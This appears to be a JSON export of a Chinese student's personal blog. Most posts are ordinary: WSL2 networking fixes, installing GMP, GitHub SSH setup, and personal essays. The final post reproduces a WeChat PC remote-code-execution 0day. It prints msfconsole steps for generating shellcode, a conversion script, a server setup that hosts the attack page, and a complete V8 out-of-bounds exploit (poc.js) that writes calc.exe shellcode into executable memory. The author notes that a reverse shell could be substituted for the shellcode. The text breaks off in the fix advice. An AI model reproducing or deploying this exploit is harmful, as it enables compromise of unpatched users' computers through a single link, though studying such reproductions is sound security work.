入住中关村2021年7月搬至中关村，虽然硬件设施远不及良乡，但人家怎么说也是10w一平 还没完全整理完的新宿舍 关于遗憾CISCN弃赛毕竟是信安最重要的一场比赛，但是分区赛当天和体系结构考试冲了……缓考和弃赛代价都很大，最后的最后还是选择了弃赛。 个人感情从去年的无话不说到现在的无话可说……要做到冰释前嫌真的很难。 理B314虽然之前无数次被要求搬离314，但是这次是真的走了……314还是314，但是314的人已经离开了。 XYJ的工位已经正式移交至XY，希望下次来的时候她能帮我开门。 关于我和理学楼B314 关于未来在竞赛保研的边缘疯狂试探，但是最后的核心竞赛已经被迫弃赛了……那就考研吧。 有人问过我为什么不工作，可能是现在的水平距离理想的工作还有很大一段距离，以及还没有放弃对科研的向往，就继续学习呗。","categories":[{"name":"informal essay","slug":"informal-essay","permalink":"https://blog.xiabee.cn/categories/informal-essay/"}],"tags":[{"name":"碎碎念","slug":"碎碎念","permalink":"https://blog.xiabee.cn/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}]},{"title":"WSL2踩坑分享","slug":"coding/WSL2踩坑分享","date":"2020-10-26T12:00:23.000Z","updated":"2022-08-13T15:39:31.416Z","comments":true,"path":"posts/wsl2-about/","link":"","permalink":"https://blog.xiabee.cn/posts/wsl2-about/","excerpt":"","text":"WSL：Windows Subsystem For Linux 前段时间听说WSL2很香，然后试了一下，确实很香……如果你不是一个WEB狗 WSL2的安装我就不具体写了，太简单了，直接看官网教程 0x00 与WSL的区别WSL1大家应该都很熟悉，WSL2也问世挺久了，我就不详细嗦了，直接看看官网解释的区别： 摘自微软官网 整体上看……这俩完全就不是一个东西嘛：wsl只是一个单纯的shell，wsl2简直就是一台虚拟机 WSL2从OS层实现了独立，不再与宿主机共享OS，解决了许多二进制狗的蜜汁BUG，但是这种独立性给WEB狗创造了更多的烦恼 0x01 主要问题IPV6没有IPV6，失去了免流的梦想…… 微软，不愧是您 服务不通最主要的问题还是网络层与宿主机不互通： 微软官方说明 ifconfig一下你会惊奇的发现它没有192网段地址： ifconfig 再来看看 WSL2 “独一无二的IP地址的虚拟化以太网适配器”： 图源：https://blog.csdn.net/swordsm/article/details/107948497 果然很复杂。再看一眼昔日称霸一方的WSL1的网络拓扑： 图源：https://blog.csdn.net/swordsm/article/details/107948497 两图对比，发现WSL1使用的是宿主机的网络，可以直接理解为一台机器，在配置上过于简单，但正因为网络共享，很多应用不能在windows和Linux中同时运行（比如Windows的phpstudy和Linux的docker） WSL2网络层使用了独立的虚拟网卡，与宿主机进行桥接，网络上实现了独立，但是也造成了麻烦，比如本地服务不互通： 比如内网请求被防火墙干掉： wsl2 ping 宿主机被拦截 宿主机 ping wsl2 能 ping 通 可能是WD把这个网桥干掉了吧…… DockerDocker Docker Docker! 也可能是我发行版的问题，在运行docker的时候一直报错，一直启动不了： 1234567Chain OUTPUT (policy ACCEPT)target prot opt source destination`, error: exit status 4INFO[2020-10-26T18:26:49.534239700+08:00] stopping event stream following graceful shutdown error=&quot;&lt;nil&gt;&quot; module=libcontainerd namespace=mobyINFO[2020-10-26T18:26:49.534502600+08:00] stopping event stream following graceful shutdown error=&quot;context canceled&quot; module=libcontainerd namespace=plugins.mobyINFO[2020-10-26T18:26:49.534542500+08:00] stopping healthcheck following graceful shutdown module=libcontainerdfailed to start daemon: Error initializing network controller: error obtaining controller instance: failed to create NAT chain DOCKER: iptables failed: iptables --wait -t nat -N DOCKER: iptables v1.8.5 (nf_tables): CHAIN_ADD failed (No such file or directory): chain PREROUTING (exit status 4) 启动很失败（x） 0x02 解决方案IPV6：无解IPV6的问题没法解决，干脆忘了它吧，等微软开发下一代产品 服务不通：手动设置+localhostLinux请求被拦截的问题……关闭专用网络防火墙可以解决：（确实是WD把这个网桥干掉了） 关闭专用网络防火墙 然后终于ping通了 网络问题大致有两种解决方案：直接localhost或者手动配置端口转发 localhost大概是微软留下的最后的希望，在不能使用127.0.0.1的情况下，localhost可以直接访问本地服务 这里直接跑了一个DVWA 端口转发可以直接参考官方文档，在宿主机的Powershell中配置： 12345678netsh interface portproxy show all# 查看转发netsh interface portproxy add v4tov4 listenport=4000 listenaddress=0.0.0.0 connectport=4000 connectaddress=192.168.101.100# 添加转发netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8000# 删除转发 Docker：强制初始化主要错误原因： 1iptables v1.8.5 (nf_tables): CHAIN_ADD failed (No such file or directory): chain PREROUTING docker.io用iptables初始化NAT网络，而Debian buster使用 nftables 而不是 iptables，导致dockerd不能正常完成NAT初始化，出错退出。 那么正确的解法应该就是强制使用iptables进行初始化： 12345sudo update-alternatives --set iptables /usr/sbin/iptables-legacysudo update-alternatives --set ip6tables /usr/sbin/ip6tables-legacy# 重启dockersudo service docker restart 然后就能跑了…… 最后其他的BUG可能忘记了，下次想起来再写 Refference https://blog.csdn.net/dqwjack/article/details/107699985 https://docs.microsoft.com/zh-cn/windows/wsl/compare-versions https://blog.csdn.net/swordsm/article/details/107948497 Reference","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://blog.xiabee.cn/tags/linux/"},{"name":"wsl","slug":"wsl","permalink":"https://blog.xiabee.cn/tags/wsl/"}]},{"title":"Linux安装GMP依赖","slug":"coding/Linux安装GMP依赖","date":"2020-09-14T12:00:23.000Z","updated":"2022-08-13T15:39:31.415Z","comments":true,"path":"posts/linux-gmp/","link":"","permalink":"https://blog.xiabee.cn/posts/linux-gmp/","excerpt":"","text":"GMP简介 官网 GMP：GNU Multiple Precision Arithmetic Library，即GNU高精度算术运算库，在现代密码学的计算中十分关键 什么是GMP？ GMP是一个用于任意精度算术的免费库，可处理带符号整数，有理数和浮点数。除了运行GMP机器中的可用内存所暗示的精度外，对精度没有实际限制。GMP具有丰富的功能集，并且这些功能具有常规接口。 GMP的主要目标应用程序是密码学应用程序和研究，Internet安全应用程序，代数系统，计算代数研究等 GMP经过精心设计，无论是小型操作数还是大型操作数，都应尽可能快。通过使用全字作为基本算术类型，使用快速算法，针对许多CPU的最常见内部循环使用经过高度优化的汇编代码并总体上强调速度，可以实现速度。 GMP的第一版发布于1991年。它不断开发和维护，每年大约发布一次新版本。从版本6开始，GMP在GNU LGPL v3 和GNU GPL v2双重许可下分发 。这些许可使该库可以免费使用，共享和改进，并允许您传递结果。GNU许可证赋予了自由，但也对非自由程序的使用设置了严格的限制。 GMP是GNU项目的一部分。有关GNU项目的更多信息，请参见GNU官方网站。 GMP的主要目标平台是Unix类型的系统，例如GNU / Linux，Solaris，HP-UX，Mac OS X / Darwin，BSD，AIX等。它还可以在Windows上以32位和64-位模式。 摘自GMP官网 安装方式：官网下载，手动安装。这里我们以 Centos7 为例 下载安装包进入官网下载最新安装包，这里我们以 gmp-6.2.0.tar.xz为例 然后解压： 123xz -d gmp-6.2.0.tar.xz tar xzf gmp-6.2.0.tar cd gmp-6.2.0 安装依赖安装GMP 之前需要先安装m4 ，不然会有各种蜜汁报错……不过m4可以直接包管理器安装 1sudo yum install m4 添加链接configure一下，同时要加上 –enable-cxx命令，否则不能使用c++库gmpxx.h 1./configure --enable-cxx 编译运行123makemake checksudo make install 测试这个时候理论上已经安装好了，我们写一个C语言程序试试： 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;gmp.h&gt;int main()&#123; mpz_t a,b; mpz_init(a); mpz_init(b); mpz_init_set_ui(a, 2); mpz_pow_ui(b, a, 1000); gmp_printf(&quot;b = %Zd\\n&quot;, b); mpz_clear(a); mpz_clear(b); return 0;&#125;// 计算2的1000次方 编译运行： 12345gcc -o test test.c -lgmp# 使用-l命令，寻找gmp链接库./test# 执行test文件 样例程序输出： 1b = 10715086071862673209484250490600018105614048117055336074437503883703510511249361224931983788156958581275946729175531468251871452856923140435984577574698574803934567774824230985421074605062371141877954182153046474983581941267398767559165543946077062914571196477686542167660429831652624386837205668069376 然后就可以去暴算现代密码学了（划掉）","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://blog.xiabee.cn/tags/linux/"}]},{"title":"2020 Summer Review of xiabee","slug":"informal-essay/2020 Summer Review of xiabee","date":"2020-09-05T12:00:23.000Z","updated":"2022-08-13T15:39:31.425Z","comments":true,"path":"posts/2020-summer/","link":"","permalink":"https://blog.xiabee.cn/posts/2020-summer/","excerpt":"","text":"有人问我最喜欢哪个季节，我觉得大概是夏季——夏季总有一些特殊的回忆： 今年的我度过了一次最长的夏天——准确的来说应该是最长的假期 0x00 前言这是我读书生涯开始以后，第一个超过六个月的“假期”……疫情宅家，几乎就没干成啥事，flag立了一堆，真正实现的貌似…….妹有吧（划掉 来莽一眼我5月23日在popi里面的flag：“考完试想干啥” 好多想干的事情呢。 考完当即大概是吃吃吃，和cc约了吨火锅，（突然发现输入法挺懂我），然后吃完火锅可能会再约几局，把最近少吃的垃圾食品全部补会来(啊巴斯……可能会去探索一下新的吃货打卡地点√ 然后抓紧时间练车车，票圈一个个老司机横空出世，本弟弟才开始报名呜呜呜，争取开学前搞到驾照🤪（这个看运气了） 然后然后，希望私有云结题后重启入侵检测的项目，争取把学姐论文里没实现的那些东西实现了……看导师心情吧，如果暑假又刷出几个其他项目，随缘了，本来入侵检测这个项目也不是我主导的。 不过可能要处理一下音频识别的项目，被隔壁寝室兄dei拉去给学妹做码农了（没错ns我说的就是你）……目前思路比较明确，最后代码实现嘛，看ns和我有多铁了🤪不出意外我俩应该是主要输出了呜呜呜。 然后如果有闲情，深入学习一下WEB，提升一下CTF水平，顺便搞一下二进制入门（现在的我二进制真的蛇皮不会，太菜了）。再顺便出一下WEB教程，把俱乐部欠下的课给补了……呜呜呜俱乐部的WEB后继无人我背全锅，但是但是，二进制没人接手我是真的没办法[哭，主要是自己也不会] 然后如果还有闲情，当然是打游戏了？？？求一个彩六上分车队呜呜呜。一个人打游戏太简单了，带上我吧，提高你的游戏难度，增强游戏成就感（x）如果没有上分车队，那我就继续白给好了，单排上紫铜不是梦（x） 草，写到一半弹出一个推送：“这个夏天，我想谈个恋爱”……害，谁不想呢，想想好了，想想算了，可能我已经忘记那种心动感觉了。 popi提问：考完试想干啥 总结一下：我5月立的flag大致是：吃吃吃、练车、项目、CTF、打游戏、谈恋爱 然后最后的最后只完成了实验室的培训、练车和打游戏 0x01 实验室暑训突然就变成实验室主任了，突然就要教学了，可是我害甚么都不会哇 因为疫情，今年实验室的集训全部转战线上，视频回放地址：B站睿小信 [&gt;:1] 开端故事要从2020年5月28号开始说起： 冯大佬找我聊换届的事情……就，挺秃燃的，还在等待培训的我们突然就要去培训别人了 虽然各种菜，但至少还是在7月2日之前把队伍凑起来了，教学计划也安排上了。 详情可见当时的推送 [&gt;:2] 培训中这是一个卑微WEB狗的自救之路……自己还没学会呢，就要去教别人了。 这次培训主讲只有三个，其中一个是主攻MISC的饿龙，WEB手PWN手各剩一个，我和411分管WEB和PWN。然后我们就开始尝试各类一夜速成…… 培训过程中给我的感jio就是，两级分化极其严重：一边是以spaceskynet为首的大佬们，蠢蠢欲动，感觉每天讲的东西都很简单，下一刻就可以暴捶我（spaceskynet应该已经可以暴捶我了，我讲的东西他几乎全都会了，全栈工程师指日可待）；另一边就像是去年的我，每日三省吾身：“这啥啊？我怎么进来的？他们咋啥都会？” 仔细回想一下，这次集训的内容还是挺多的，前四天就超出了我们这届一年的量，大概因为18级的我们因为种种原因错过了冬训和暑训。从Linux入门到实战渗透，居然只用了21天。 这次培训的对象不是我们，但是还是感觉受益良多，尤其是培养了自我学习能力 [&gt;:3] 结训赛结训赛是我突发奇想搞出来的，当初只是想试个水，为后续新生赛做做准备，没想到我被炸鱼了[摸鱼的后果]。 整个比赛赛况很激烈，而且可以看出来大家都挺能肝 结训赛具体内容可以莽一眼我的前两篇博客： BIT-ISLab 2020结训赛回顾 ISLab 2020结训赛WP 0x02 驾驶员的自我修养没想到宅家半年居然就拿到驾照了……最开始是被人拉着去报名的，然后练车的过程都害挺顺利，除了裸考科目四白给了一次 七月立的flag： 上个月收到一条popi提问，问我为啥子练车那么顺的： 哈哈哈哈哈哈哈哈可能是我che感比较好吧（划掉）就……不要怕它，就像骑车一样，不怕摔倒自然就敢骑了。(我感觉开che只要不熄火一切好说？但是像我这种莽夫流开che也不太好，经常被教练骂，因为科二在飙车……到科三了就没啥事，科三本来就要上路的# 敏感词到底是啥啊？？？为什么一直发不出去啊 考驾照为什么那么厉害 感觉像老司机一样 是天赋吗 怎么做到做任何事都比同龄人厉害 膜拜 popi里面发不出“车”字确实有点迷…… 从科二到科三一路过来，我觉得我莽夫流实锤了……感觉不太喜欢教练的对点方式，总想着自己去放纵。 科二的时候被抓去练了一整天的倒车入库，倒到后面就开始乱开了： 本来小脾气就有点大，还被抓过来练了一天这种对点的应试技巧……然后就开始放飞自我，“劳资不对点啦，盲开入库！”——而且盲开的时候比对点还稍微准一点，可能这就是玄学吧……不过飙车入库的时候被教练抓到了就有点尴尬。 虽然但是，这八个小时的倒车入库确实让我倒车倒起来非常顺手，就算是考试的车子出了问题也能够从容应对： 当时那车从倒挡弹回了一档，人都给看傻了……害好俺反应快给它重新摁会去了（确信） 到科三就真的开始放飞自我了，每天都在百米加减档的跑道上疯狂试探这破车的加速极限： 虽然但是，俺也就在训练场上体验一下60码的感jio，在大马路上我还是不会乱飙的……毕竟是学了文明驾驶礼仪的人（划掉） 然后科三顺理成章的一遍满分通过 没想到最后的最后我居然栽在了科四上，裸考要命.jpg 不过海星，在我返校前我考完了科四，在我去机场的路上驾照寄到了手里。现在的我可以合法开车了。 0x03 吃货养成计划谁能相信我一个月吃光了我所有的积蓄……平时在学校放纵惯了，在家下馆子没啥感觉了（可能是出门的频率确实比上课的时候多得多） 放几个随手拍的吃货照，建议直接保存当壁纸，虽然很丑，但是可能可以激起食欲（x） 放一个神奇的翻译 0x04 结束2020.8.15，从我上飞机的那一刻起，我的“暑假”就结束了 不过回到了实验室之后，也在苦中找到了一些乐趣：整栋楼就我一间在使用，爱干嘛干嘛 回到学校之后对学校的某些操作十分的反感，并且进行了相应的挣扎，虽然没有甚么用 放一个返校后写的遇事不决上知乎的流量脚本，感兴趣的话可以继续开发一下：fucking-views 虽然我理已经不可能拥有知乎热搜了，认真 0xff 小结这个夏天，感觉还算快乐吧。 虽然很多事情都没有完成，虽然学校的某些操作确实令人难以接受——但至少在家里做了想做的事，在学校也见到了想见的人。 不想在这里过多的吐槽某些智障行为……那就这样吧。 （先写到这里，等过两天想起来什么再继续补充）","categories":[{"name":"informal essay","slug":"informal-essay","permalink":"https://blog.xiabee.cn/categories/informal-essay/"}],"tags":[{"name":"碎碎念","slug":"碎碎念","permalink":"https://blog.xiabee.cn/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}]},{"title":"GitHub配置SSH Key","slug":"coding/Github-ssh","date":"2020-08-27T11:56:35.000Z","updated":"2022-08-13T15:39:31.406Z","comments":true,"path":"posts/github-ssh/","link":"","permalink":"https://blog.xiabee.cn/posts/github-ssh/","excerpt":"","text":"在Github上提交代码，每次 push 都需要输入一次密码，特别麻烦，所以现在就记录一下用SSH登陆GitHub的过程 先来康康这两个登陆方式有啥区别： 1234https://github.com/xiabee/fucking-views.git# use httpsgit@github.com:xiabee/fucking-views.git# use ssh 第一种直接使用https，可以直接浏览器访问，方便查阅，但是每次push都要输入密码 第二种使用ssh，不能直接访问，但是在push的时候可以保留密钥文件 个人感觉，在开发的时候，还是使用ssh比较方便。 那就康康如何配置SSH： 0x00 配置全局信息仅第一次使用的时候需要配置，如果已经配置过了直接忽略 查看配置信息： 1git config --list 添加全局变量：用户名、邮箱 12git config --global user.name &quot;xiabee&quot;git config --global user.email &quot;xiabee@foxmail.com&quot; 0x01 生成SSH密钥对先检查一下本地是否存在密钥对 12cd ~/.sshls id_rsa 和 id_rsa.pub 分别是ssh的私钥和公钥 如果没有的话就现场生成一个： 12ssh-keygen -t rsa -C &quot;xiabee@foxmail.com&quot;# 邮箱填自己的 0x03 配置密钥对查看公钥： 12cat id_rsa.pub# 查看私钥信息 配置GitHub公钥信息： settings： SSH and GPG keys new SSH key把公钥拷贝进去即可 0x04 验证123$ ssh -T git@github.comEnter passphrase for key &#x27;/c/Users/14793/.ssh/id_rsa&#x27;:Hi xiabee! You&#x27;ve successfully authenticated, but GitHub does not provide shell access. 出现这个就可以使用ssh了 0x05 如果已经 git clone 了 https 怎么办进入 /.git 文件夹，找到 config 文件，修改 url 的值即可 123[remote &quot;origin&quot;] url = git@github.com:xiabee/fucking-views.git fetch = +refs/heads/*:refs/remotes/origin/*","categories":[{"name":"coding","slug":"coding","permalink":"https://blog.xiabee.cn/categories/coding/"}],"tags":[{"name":"git","slug":"git","permalink":"https://blog.xiabee.cn/tags/git/"},{"name":"ssh","slug":"ssh","permalink":"https://blog.xiabee.cn/tags/ssh/"}]},{"title":"微信RCE 0day复现","slug":"ctf/微信RCE复现-2021.4.18","date":"2020-04-18T12:00:23.000Z","updated":"2022-08-13T15:39:31.424Z","comments":true,"path":"posts/wechat-0day/","link":"","permalink":"https://blog.xiabee.cn/posts/wechat-0day/","excerpt":"","text":"0xFF 免责声明由于传播、利用此文提供的信息而造成的任何直接或间接的后果，均有使用者承担，本站不为此承担任何责任。 太长不看版：(2021年4月17日的0day漏洞) 3.2.1.132及之前版本的PC版微信有安全漏洞，通过微信内置浏览器点击恶意链接，即可实现任意命令执行（RCE） 测试链接：http://xiabee.cn:9999/ POC源码：http://xiabee.cn:9999/poc.js 以上测试为打开Windows系统（64位机）内置计算器 RCE(Remote command/code execute)漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。具体能做什么，只有受害者想不到，没有攻击者做不到（假的，这个需要技术的）。比较常见的应用为shell反弹，即通过构造恶意代码，打开控制受害者机器的大门，再通过花式提权，获取机器的最高权限（如果可以的话）。理论上不反弹shell也能执行很多危险造作，比如删库跑路等，具体可以知乎搜索CTF搅屎棍（误） 简单解释一下RCE 0x00 故事起因昨天看到奇安信的紧急通告： 紧急更新公告 “严重安全问题”，“强烈建议”，这BUG好猛啊，是不是可以RCE啊，这不赶紧来试一下 然后去360响应中心上找了一下预警……发现确实是个在野漏洞： 组件: Windows版微信 漏洞类型: 远程代码执行 影响: PC接管 简述: 攻击者可以通过微信发送一个特制的web链接，用户一旦点击链接，Windows版微信便会加载执行攻击者构造恶意代码，最终使攻击者控制用户PC。 https://cert.360.cn/warning/ 0x01 漏洞成因安全预警里面也说了，是Chrome的安全问题导致的……PC端微信调用了较低版本的Chrome内核，而且没有开启沙箱（–no-sandbox模式），使用微信内置浏览器时，会触发Chrome内核解释器的漏洞，造成浏览器PWN，实现任意命令执行（RCE）。 0x02 漏洞复现a.配置环境首先需要找一个没有更新微信同学要一下微信安装包…… 其实官网也有历史版本，只是比较隐蔽：微信历史版本 我们下载并测试3.1.0： 为什么不用最新版呢——因为最新版标记的日期虽然是0day曝光之前的，但是下载下来却是3.2.1.142（已经修复了漏洞的版本www） b.寻找EXP模板去gayhub查查有木有别人写好的exp，居然还真有。 https://github.com/Jaky5155/Wechat_0day 而且仿佛是新鲜的，新鲜到README都没写（x）： https://github.com/Jaky5155/Wechat_0day 点进去莽了一眼，好像就是从Chrome 0day的EXP里面CV过来的 不过我还是给了他一个star，毕竟能嫖到的代码谁会想自己写呢（x） 仔细看一眼，发现shellcode需要我们自己写： 3.编写shellcode因为只是做测试，就不搞花里胡哨的shell反弹了，做一个最简单的，打开计算器。 有两种方法：一种是手撸汇编代码，生成二进制文件，找到代码段对应机器码，然后copy下来即可；第二中是借助MSF直接生成机器码……手撸shellcode有点顶，下次想起来单独写一篇博客，这里我们通过MSF直接生成： 12345678910msfconsole# 启动msf控制台use windows/execset CMD calc.exeset EXITFUNC thread#设置参数generate -t# 生成buf 得到的shellcode如下： 我们通过Python脚本将其转换为需要的list形式： 1234567891011121314151617181920import binasciibuf = &quot;\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50&quot; + \\&quot;\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26&quot; + \\&quot;\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7&quot; + \\&quot;\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78&quot; + \\&quot;\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3&quot; + \\&quot;\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01&quot; + \\&quot;\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58&quot; + \\&quot;\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3&quot; + \\&quot;\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a&quot; + \\&quot;\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x6a\\x01\\x8d&quot; + \\&quot;\\x85\\xb2\\x00\\x00\\x00\\x50\\x68\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb&quot; + \\&quot;\\xe0\\x1d\\x2a\\x0a\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c&quot; + \\&quot;\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53&quot; + \\&quot;\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00&quot;code = [hex(ord(x)) for x in buf]print(&#x27;,&#x27;.join(code)) 然后将结果复制粘贴到poc.js中 4.配置服务端直接本地起一个一键式容器（其实只要用各种方法开启了WEB服务就行），由于不涉及数据库什么的，随手写了一个docker-compose： docker-compose.yml：直接拖了个LAMP，没啥花里胡哨的 12345678910111213141516171819202122version: &#x27;3&#x27;services: # 基本环境 WECHAT_POC: # image直接拖了个lamp image: tutum/lamp ports: - 9999:80 volumes: - ./www:/var/www/html tty: true networks: - net environment: TZ: Asia/Shanghainetworks: # 配置docker network net: # external: # name: h1ve_frp_containers index.html：这部分就可以做的花里胡哨了，只要调用了poc.js就行 12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;wechat&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Hello World!&lt;/h1&gt; &lt;script src = &quot;poc.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; poc.js：这个是攻击的核心，尤其是shellcode部分（这里的shellcode是刚刚自己掰的，功能是打开计算器） 框架部分是嫖的，感谢Jaky5155开源的EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170ENABLE_LOG = true;IN_WORKER = true;// run calc and hang in a loop//var shellcode = [#shellcode];var shellcode = [0xfc, 0xe8, 0x82, 0x0, 0x0, 0x0, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 0x8b, 0x52, 0xc, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0xf, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c, 0x2, 0x2c, 0x20, 0xc1, 0xcf, 0xd, 0x1, 0xc7, 0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x1, 0xd1, 0x51, 0x8b, 0x59, 0x20, 0x1, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49, 0x8b, 0x34, 0x8b, 0x1, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0xd, 0x1, 0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x3, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58, 0x8b, 0x58, 0x24, 0x1, 0xd3, 0x66, 0x8b, 0xc, 0x4b, 0x8b, 0x58, 0x1c, 0x1, 0xd3, 0x8b, 0x4, 0x8b, 0x1, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a, 0x1, 0x8d, 0x85, 0xb2, 0x0, 0x0, 0x0, 0x50, 0x68, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0xa, 0x68, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x3c, 0x6, 0x7c, 0xa, 0x80, 0xfb, 0xe0, 0x75, 0x5, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x0, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x0];// open calcfunction print(data) &#123;&#125;var not_optimised_out = 0;var target_function = (function (value) &#123; if (value == 0xdecaf0) &#123; not_optimised_out += 1; &#125; not_optimised_out += 1; not_optimised_out |= 0xff; not_optimised_out *= 12;&#125;);for (var i = 0; i &lt; 0x10000; ++i) &#123; target_function(i);&#125;var g_array;var tDerivedNCount = 17 * 87481 - 8;var tDerivedNDepth = 19 * 19;function cb(flag) &#123; if (flag == true) &#123; return; &#125; g_array = new Array(0); g_array[0] = 0x1dbabe * 2; return &#x27;c01db33f&#x27;;&#125;function gc() &#123; for (var i = 0; i &lt; 0x10000; ++i) &#123; new String(); &#125;&#125;function oobAccess() &#123; var this_ = this; this.buffer = null; this.buffer_view = null; this.page_buffer = null; this.page_view = null; this.prevent_opt = []; var kSlotOffset = 0x1f; var kBackingStoreOffset = 0xf; class LeakArrayBuffer extends ArrayBuffer &#123; constructor() &#123; super(0x1000); this.slot = this; &#125; &#125; this.page_buffer = new LeakArrayBuffer(); this.page_view = new DataView(this.page_buffer); new RegExp(&#123; toString: function () &#123; return &#x27;a&#x27; &#125; &#125;); cb(true); class DerivedBase extends RegExp &#123; constructor() &#123; // var array = null; super( // at this point, the 4-byte allocation for the JSRegExp `this` object // has just happened. &#123; toString: cb &#125;, &#x27;g&#x27; // now the runtime JSRegExp constructor is called, corrupting the // JSArray. ); // this allocation will now directly follow the FixedArray allocation // made for `this.data`, which is where `array.elements` points to. this_.buffer = new ArrayBuffer(0x80); g_array[8] = this_.page_buffer; &#125; &#125; // try&#123; var derived_n = eval(`(function derived_n(i) &#123; if (i == 0) &#123; return DerivedBase; &#125; class DerivedN extends derived_n(i-1) &#123; constructor() &#123; super(); return; $&#123;&quot;this.a=0;&quot;.repeat(tDerivedNCount)&#125; &#125; &#125; return DerivedN; &#125;)`); gc(); new (derived_n(tDerivedNDepth))(); this.buffer_view = new DataView(this.buffer); this.leakPtr = function (obj) &#123; this.page_buffer.slot = obj; return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt); &#125; this.setPtr = function (addr) &#123; this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt); &#125; this.read32 = function (addr) &#123; this.setPtr(addr); return this.page_view.getUint32(0, true, ...this.prevent_opt); &#125; this.write32 = function (addr, value) &#123; this.setPtr(addr); this.page_view.setUint32(0, value, true, ...this.prevent_opt); &#125; this.write8 = function (addr, value) &#123; this.setPtr(addr); this.page_view.setUint8(0, value, ...this.prevent_opt); &#125; this.setBytes = function (addr, content) &#123; for (var i = 0; i &lt; content.length; i++) &#123; this.write8(addr + i, content[i]); &#125; &#125; return this;&#125;function trigger() &#123; var oob = oobAccess(); var func_ptr = oob.leakPtr(target_function); print(&#x27;[*] target_function at 0x&#x27; + func_ptr.toString(16)); var kCodeInsOffset = 0x1b; var code_addr = oob.read32(func_ptr + kCodeInsOffset); print(&#x27;[*] code_addr at 0x&#x27; + code_addr.toString(16)); oob.setBytes(code_addr, shellcode); target_function(0);&#125;try &#123; print(&quot;start running&quot;); trigger();&#125; catch (e) &#123; print(e);&#125; 0x04 测试效果主机服务跑起来，虚拟机用过微信内置浏览器访问主机地址——成功弹出计算器： 然后在服务器上也配置一个：http://xiabee.cn:9999/ 经过多次测试，计算器正常弹出，漏洞有效。 0x05 漏洞危害与修复建议这是一个RCE（Remote Command Execute，任意命令执行）！这是一个RCE！这是一个RCE！重要的事情说三遍！ 这里只是展示了如何打开计算器，但是理论上攻击者可以根据需要编写任意的shellcode以控制受害者主机，比如最常见的shell反弹等；而且这个利用浏览器的漏洞，不需要攻击者提供恶意软件（不需要受害者下载病毒），只需精心设计一串代码，提供一个链接，诱惑受害者点击，危险指数较高。 修复的话……部分安全软件（比如Windows 